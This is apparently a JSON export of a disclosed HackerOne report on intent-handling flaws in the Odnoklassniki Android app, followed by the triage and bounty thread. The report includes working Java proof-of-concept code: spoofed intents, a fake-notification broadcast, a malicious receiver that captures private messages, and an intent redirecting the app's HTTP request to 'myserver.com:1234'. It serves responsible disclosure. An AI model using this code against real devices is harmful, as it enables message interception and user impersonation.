@@ -1,0 +1,366 @@
+{
+  "id": 97295,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85NzI5NQ==",
+  "url": "https://hackerone.com/reports/97295",
+  "title": "Multiple critical vulnerabilities in Odnoklassniki Android application",
+  "state": "Closed",
+  "substate": "resolved",
+  "readable_substate": "Resolved",
+  "created_at": "2015-11-02T18:02:44.595Z",
+  "submitted_at": "2015-11-02T18:02:44.595Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "hardc0re",
+    "url": "/hardc0re",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/003/850/84db2b3ba471ae46a0d169a2dcde202814b55f04_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 1782,
+    "url": "https://hackerone.com/ok",
+    "handle": "ok",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/001/782/0e7098faf92785cddc86bcf693dbb068dad14311_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/782/0e7098faf92785cddc86bcf693dbb068dad14311_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": false,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "ok.ru",
+      "twitter_handle": "",
+      "website": "http://ok.ru",
+      "about": "Odnoklassniki social network"
+    }
+  },
+  "has_bounty?": true,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+
+  ],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2016-07-26T23:07:57.267Z",
+  "bug_reporter_agreed_on_going_public_at": "2016-06-26T23:07:48.326Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello,\n\nI have recently found several critical vulnerabilities in Odnoklassniki Android application, which is one of your projects, thus I am reporting it here.\n\nThe first vulnerability is so called Intent spoofing.\nThe vulnerability lies in ability to start the video upload activity of Odnoklassniki application from inside a different application installed on the same device. This vulnerability happens when a component is made public and requires no special permission. A consequence of this may be that a malicious app sends an intent to a legitimate component (VideoUploadActivity), which will result in data injection or state change (in our case a user might be tricked into uploading content he normally would not upload to ok.ru network).\n\nThe following code snippet demonstrates possible exploit code:\n\nIntent m = new Intent();\nm.setClassName(\"ru.ok.android\",\"ru.ok.android.ui.activity.StartVideoUploadActivity\");\nstartActivity(m);\n\nStaying with the intent spoofing vulnerability, there is one more case of this kind of vulnerability.\nThis time a malicious application is able to send fake Notifications to user about literally any happening or action in Odnoklassniki. User can be tricked this way to do action he did not intend to again. A malicious app might send fake private messages to the victim user, impersonating other users! The user can be misinformed about a comment on his photo or a response in any of groups he belongs to! The origin of this vulnerability is just as the former one, action is made public in the application and it does not require the calling application to have any kind of permission to do so.\nThis vulnerability originates from class ok.ru.android.services.app.NotifyReceiver\n\nPossible fix to this? Explicitly set the value of android:exported to false or make use of permissions.\n\nA short code snippet demonstrating possible exploitation:\n\nIntent u = new Intent();\nu.setAction(\"ru.ok.android.action.NOTIFY\");\nu.putExtra(\"key\", \"d-147298617\");\nu.putExtra(\"message\", \"Hello there! This is a fake message. You have been tricked.\");\n\n//u.putExtra(\"conversation_id\", \"\");\n//u.putExtra(\"mediatopic_id\", \"413434225584\");\n\nu.putExtra(\"dsc_id\", \"612470493988:USER_PHOTO\");\n\ngetActivity().sendBroadcast(u);\n\nAnother vulnerability that I have found is Unauthorized intent receipt, in this certain case it is unauthorized notification (message) receipt. Knowing this vulnerability a potential attacking application is able to intercept private messages, updates, photo comments, post comments, etc. sent to the user. The cause of this vulnerability lies in AndroidManifest.xml. The receipt of a notification (message) should be protected from intercepting with proper permission requirement. Possible mitigation - Do not use implicit intents for communication between the components of a single app or require the target application to have a proper permission acquired.\n\nHere I am enclosing a complete malicious receiver code snippet, which is able to intercept all \"messages\" shown to the user as a notification. Please note, that the malicious application is able to see not only the message but the userId of the user who sent it and many other sensitive details.\n\npublic class MaliciousReceiver extends BroadcastReceiver {\n@Override\npublic void onReceive(Context context, Intent intent) {\n    if (\"ru.ok.android.action.NOTIFY\".equals(intent.getAction())) {\n\n        Bundle localBundle = intent.getExtras();\n        if (localBundle != null) {\n            String str1 = localBundle.getString(\"key\");\n            String str2 = localBundle.getString(\"message\");\n            String str3 = localBundle.getString(\"cid\");\n            if (str3 != null) {\n                String str4 = localBundle.getString(\"caller_name\");\n                String str5 = localBundle.getString(\"server\");\n                return;\n            }\n\n            String str4 = localBundle.getString(\"nconversation_id\");\n            String str5 = localBundle.getString(\"dsc_id\");\n\n            Toast.makeText(context, \"key:\" + str1 + \"\\nmessage: \" + str2 + \"\\ncid: \" + str3 + \"\\nconversation_id: \" + str4 + \"\\ndsc_id: \" + str5, Toast.LENGTH_SHORT).show();\n        }\n    }\n}\n\n}\n\nAnd here comes the most serious issue. The vulnerabilities explained above affected the data and user privacy in scope of your application \"only\". This vulnerability, on the other side, violates the whole android security mechanism. The vulnerability is known as \"Privilege redelegation\". It happens when your application is used as a mediator to help other (malicious) applications to circumvent android permission system.\nThis vulnerability lies in class ru.ok.android.videochat.VideochatController.java .\nThe permission which is mediated to 3rd party applications here is the INTERNET persmission, which is truly the most dangerous permission out there.\nWhen we analyze the following line of code:\n\nlocalHttpMethod = new RestApiMethodBuilder(localServiceStateHolder, HttpMethodType.GET).setTargetUrl(new URI(\"http://\" + this.server + \"/\", false)).addRelativePath(\"api-get-signal\", true).addSignedParam(\"uid\", localServiceStateHolder.getUserId(), false).addSignedParam(\"cid\", str1, false).addSignedParam(\"client\", Constants.Api.CLIENT_NAME, false).build();\n\nwe can clearly notice that there's a variable (this.server) passed directly to the method construction.\nAs you can imagine, I am able to pass the address of my own server to this variable through an Intent.\nThis will result in Odnoklassniki application sending an HTTP request to my server with all the data contained!\nWe cannot alter the data contained within the request, but that does not stop us.\nOnce any 3rd party application is able to send a HTTP request to arbitrary server in the world just with a single Intent, without even the need to have the INTERNET permission acquired itself, it obviously violates the android security permission principle.\n\nThe code demonstration would require longer piece of code, thus I will try to explain possible exploit scenario verbally.\nAs we can perform a single HTTP request with a single Intent sent to ok.ru application, we can do this more times in row without an issue! Data does not need to be transfered from the device using a text, we could use a morse code for example. We could send the Intents within specific time intervals and delays, which would reflect in arbitrary information being leaked from the device to an arbitrary server. The morse code processing in our means would be processed at the server side of course.\n\nThe mediated HTTP request from a 3rd party application may be achieved using a code like this:\n\nIntent m = new Intent();\nm.setAction(\"ru.ok.android.action.NOTIFY\");\nm.putExtra(\"key\", \"vchat\");\nm.putExtra(\"cid\", \"c60b0e06695a4ce896261247b43f772b\");\nm.putExtra(\"caller_name\", \"Fake User\");\nm.putExtra(\"server\", \"myserver.com:1234\");\ngetActivity().sendBroadcast(m);\n\nI hope I have explained each of the vulnerabilities clearly enough so that you can patch them with ease.\nIf something is not clear enough, please feel free to ask more details. I can provide some PoC with pictures in case of need too.\n\nI am also enclosing a PoC of the privilege redelegation vulnerability.\nIn the picture there is the HTTP request that is sent by my demo malicious (exploit) application through the ok.ru application to my server.\n\nI am looking forward to hearing from you soon.\n\nKind regards,\nJan Hodermarsky\n",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 59921,
+      "file_name": "Auswahl_045.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/059/921/0f78a161f3d84a8c7c7005e6d658621cd0e3110d/Auswahl_045.png?response-content-disposition=attachment%3B%20filename%3D%22Auswahl_045.png%22%3B%20filename%2A%3DUTF-8%27%27Auswahl_045.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ4XR7FADI%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T081643Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEDAaCXVzLXdlc3QtMiJHMEUCIQDKk5wN9ph3nw7lju9CWwe7X2HrWWHuO2eCIJ5EHtGa6QIgGJJlYbCAihaUF%2FM088FFQu1bla3zuEssAzL9YO6rij0qsQUIKRADGgwwMTM2MTkyNzQ4NDkiDMbphoLsoVV4O78KySqOBdSUftDrgf%2B7izQf2skYIWsaZ1biSN3yL6unVLjbwLfhb5nb0c3f2TbOrdJ1Wnf6G0Byvplyo3QqnEwctFLW0lAfiqKUK5C2XgyXTWaQRv0JMrFPWR9yKVDY8BzizeJ%2BGkKpKNq3EKqVesipiClbUOp2u7hexkIpFOaSprdTE2g%2B1oL3t3IsB7R87aju3MPOLF3cQE%2FotQsVnD4HkWLCOuG4RUy%2B%2BhpZX9hnrB5CDN9LhjeIQorvB1%2FfIZIy7gzmiJ19uRMuGEfLkXCLU3LABGmzM%2Bbb3U8bxf1cch0nqAoFKvWcSZRwRTDo3%2FQ8mABRsGBINrTmrFL8bI%2FMKAKMbUKHH4aKCAQxejCvuvW68xpFnLsI7K70WJCHZvxX3W9hXgiLpWfRRPpT58YqUH4thiAgffpf6zDInKTbmYP72C%2F7RELZmoSZW2ZEy7WL6az0L084dlCXjkU8JTW5vCbY49yWsclgbC4FPbBFOOLpezerWD0uEwYGj6xsFXT9e2VRwBq7yWfYBcal2DeKCWDQS6Ny4b4%2BnQWToGLCbZNBS%2BasRFdWlSJroy77iBUIYQQcW8VPfcycCSutOUwuokoK0QP%2FL1qPG6IEkfMoJrfsHCCA%2BdyzhvB%2FIv5MUNEoxNGSxC%2BvtNcAJDCdgVzVVjPS3HvG3NZuuwkntct0V%2FYzDIKSnFLqVpx2vz71MmvRcfBKFTGwzQh0NdGLxfdHy94paJoabAVIsBP6FxPZ7htE%2FtO5wBwYrbY10QYW02pwXEnMYeLcO1KJNRcwfdEBWPAslt1OlyBujWoEJhTWgve2DJTKscgMuxcXG%2BTk%2BmNND%2B%2FixUT52IgPBOz%2FVMYpJqV%2FUoV90XKpYPCJQNZAvhnLnjDTsLqoBjqxAZ%2BUJLSnSgIWjRBVhhsgKxU2P%2BZd9uRqPQdnC6cxgb6%2B56F4EDm8qH2C54qlU5cE0grMwf5Cry0pz9S36HcoDMfPK6e88SvZo7zGHFJUHcCBp%2BRn8CTUYvRjtKeKs57sfO2aWOWZemwCno2CsIj9oWK%2FykPIxiYqBMQeKGHOb%2BDrGZIb1KRjfSncoPU72gpfqCu0HEifkYsnJ8UzWZDhor5%2FpcUbPohw0ZzuleJiSth%2BlA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=e2a25693a7198ecdf9c1bf600e2a53baa6562022e74346911e8592f316652cdd",
+      "file_size": 22819,
+      "type": "image/png",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2016-07-26T23:07:48.526Z",
+  "allow_singular_disclosure_after": -225882534.99869365,
+  "singular_disclosure_allowed": true,
+  "vote_count": 13,
+  "voters": [
+    "kapytein",
+    "eboda",
+    "muhammad_uwais",
+    "vraj",
+    "bharatrazdan1",
+    "drstache",
+    "sumit7",
+    "b0352ac9ad5b91f3bbcc97d",
+    "dyabla",
+    "ceortiz",
+    "and 3 more..."
+  ],
+  "structured_scope": null,
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 642977,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "Hi! Thanks for the report.",
+      "automated_response": false,
+      "created_at": "2015-11-03T15:27:25.059Z",
+      "updated_at": "2015-11-03T15:27:25.059Z",
+      "actor": {
+        "username": "alexandra_ok",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexandra_ok",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ok"
+    },
+    {
+      "id": 720339,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hello, I have heard the vulnerabilities has been resolved already. Are there any updates from your side?",
+      "automated_response": false,
+      "created_at": "2015-12-15T00:20:55.956Z",
+      "updated_at": "2015-12-15T00:20:55.956Z",
+      "actor": {
+        "username": "hardc0re",
+        "cleared": false,
+        "verified": false,
+        "url": "/hardc0re",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/850/84db2b3ba471ae46a0d169a2dcde202814b55f04_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ok"
+    },
+    {
+      "id": 759078,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Are there any updates?",
+      "automated_response": false,
+      "created_at": "2016-01-15T09:24:07.112Z",
+      "updated_at": "2016-01-15T09:24:07.112Z",
+      "actor": {
+        "username": "hardc0re",
+        "cleared": false,
+        "verified": false,
+        "url": "/hardc0re",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/850/84db2b3ba471ae46a0d169a2dcde202814b55f04_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ok"
+    },
+    {
+      "id": 775709,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@alexandra_ok Are there any updates regarding this report?",
+      "automated_response": false,
+      "created_at": "2016-01-28T16:40:19.192Z",
+      "updated_at": "2016-01-28T16:40:19.192Z",
+      "actor": {
+        "username": "hardc0re",
+        "cleared": false,
+        "verified": false,
+        "url": "/hardc0re",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/850/84db2b3ba471ae46a0d169a2dcde202814b55f04_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ok"
+    },
+    {
+      "id": 1022867,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "Hey, this is starting to be ridiculous. How much more time do you need to get things moving? @alexandra_ok ",
+      "automated_response": false,
+      "created_at": "2016-06-18T22:33:01.384Z",
+      "updated_at": "2016-06-18T22:33:01.384Z",
+      "actor": {
+        "username": "hardc0re",
+        "cleared": false,
+        "verified": false,
+        "url": "/hardc0re",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/850/84db2b3ba471ae46a0d169a2dcde202814b55f04_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ok"
+    },
+    {
+      "id": 1024666,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "Hi! \nMost of the described issues have been fixed, except for the one with StartVideoUploadActivity. This is hardly exploitable since actual upload requires explicit user confirmation. Let's consider the report resolved.",
+      "automated_response": false,
+      "created_at": "2016-06-20T15:07:53.511Z",
+      "updated_at": "2016-06-20T15:07:53.511Z",
+      "actor": {
+        "username": "alexandra_ok",
+        "cleared": false,
+        "verified": false,
+        "url": "/alexandra_ok",
+        "profile_picture_urls": {
+          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "hardc0re",
+        "url": "/hardc0re"
+      },
+      "genius_execution_id": null,
+      "team_handle": "ok"
+    },
+    {
+      "id": 1024669,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BountyAwarded",
+      "message": "Mobile apps are out of the program scope (https://hackerone.com/ok), but we still award critical issues. Thanks for reporting this and for your patience.",
+      "automated_response": false,
+      "created_at": "2016-06-20T15:09:23.462Z",
+      "updated_at": "2016-06-20T15:09:23.462Z",
+      "actor": {
+        "url": "/ok",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/782/0e7098faf92785cddc86bcf693dbb068dad14311_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "profile": {
+          "name": "ok.ru"
+        }
+      },
+      "bounty_currency": "usd",
+      "genius_execution_id": null,
+      "team_handle": "ok",
+      "collaborator": {
+        "username": "hardc0re",
+        "url": "/hardc0re"
+      }
+    },
+    {
+      "id": 1039032,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "Can this report go public? Thank you for the reward.",
+      "automated_response": false,
+      "created_at": "2016-06-26T23:07:48.422Z",
+      "updated_at": "2016-06-26T23:07:48.422Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "hardc0re",
+        "cleared": false,
+        "verified": false,
+        "url": "/hardc0re",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/850/84db2b3ba471ae46a0d169a2dcde202814b55f04_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ok"
+    },
+    {
+      "id": 1060263,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "At least a response would be polite. I am on opinion that making this public would help people to learn.",
+      "automated_response": false,
+      "created_at": "2016-07-08T21:00:25.951Z",
+      "updated_at": "2016-07-08T21:00:25.951Z",
+      "actor": {
+        "username": "hardc0re",
+        "cleared": false,
+        "verified": false,
+        "url": "/hardc0re",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/850/84db2b3ba471ae46a0d169a2dcde202814b55f04_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "ok"
+    },
+    {
+      "id": 1089613,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2016-07-26T23:07:57.426Z",
+      "updated_at": "2016-07-26T23:07:57.426Z",
+      "actor": {
+        "url": "/ok",
+        "ibb": false,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/001/782/0e7098faf92785cddc86bcf693dbb068dad14311_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "profile": {
+          "name": "ok.ru"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "ok"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
